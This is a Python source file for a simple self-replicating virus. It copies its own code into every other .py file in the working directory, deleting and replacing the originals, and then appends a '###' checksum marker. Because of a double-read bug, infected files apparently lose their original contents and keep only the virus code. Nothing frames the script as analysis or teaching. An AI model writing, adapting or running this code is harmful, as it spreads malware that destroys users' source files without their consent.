#!/usr/bin/python
import glob,os,hashlib,winsound


FREQ = 2500  
DUR = 1000  
global i
def Beep(frequency,duration):
    winsound.Beep(frequency, duration)

def create_checksum(filename):
    hasher = hashlib.md5()
    with open(filename,'rb') as file:
        hasher.update(file.read())
    return hasher.hexdigest()

def watermark():
    for file in glob.glob("*.py"):
        if file == __file__:
            continue
        append = open(file,'a')
        if append.mode == 'a':
            if '###' not in append.read():
                append.write("###" + create_checksum(file))

def infect(PAYLOAD):
    i = 0
    for file in glob.glob("*.py"):
        if file == __file__:
            continue
        f = open(file, "r")
        if f.mode == 'r':
            if '###' not in f.read():
                infected = open('infected_'+str(i)+'.py','w')
                infected.write(f.read() + PAYLOAD)
                f.close()
                infected.close()
                os.remove(file)
                os.rename('infected_'+str(i)+'.py',file)
                i = i + 1
    watermark()
            



with open(__file__,'r') as current_file:
    PAYLOAD = current_file.read()

Beep(FREQ,DUR)
infect(PAYLOAD)



